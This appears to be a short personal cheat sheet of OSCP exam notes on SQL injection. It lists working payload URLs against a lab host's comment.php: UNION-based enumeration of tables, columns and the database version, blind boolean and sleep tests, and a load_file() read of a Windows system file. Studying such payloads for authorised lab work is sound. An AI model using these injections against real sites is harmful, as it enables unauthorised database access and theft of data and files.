# oscp-notes

## SQL Injection

### Enumerating the Database (using union statements)
```
http://10.x.x.x/comment.php?id=782%20union%20select%201,2,3,4,table_name,6%20from%20information_schema.tables
http://10.x.x.x/comment.php?id=782%20union%20select%201,2,3,4,@@version,6
http://10.x.x.x/comment.php?id=782%20union%20select%201,2,3,4,5,6
http://10.x.x.x/comment.php?id=782%20union%20all%20select%201,2,3,4,column_name,6%20from%20information_schema.columns%20where%20table_name=%27users%27
```

### Blind SQL Injection
```
http://10.x.x.x/comment.php?id=782%20and%201=1 (and 1=1)
http://10.x.x.x/comment.php?id=782-sleep(5) (-sleep(5))
```

### Load_File Function
```
http://10.11.14.19/comment.php?id=782%20union%20all%20select%201,2,3,4,load_file(“c:/windows/system32/drivers/etc/hosts”),6
```
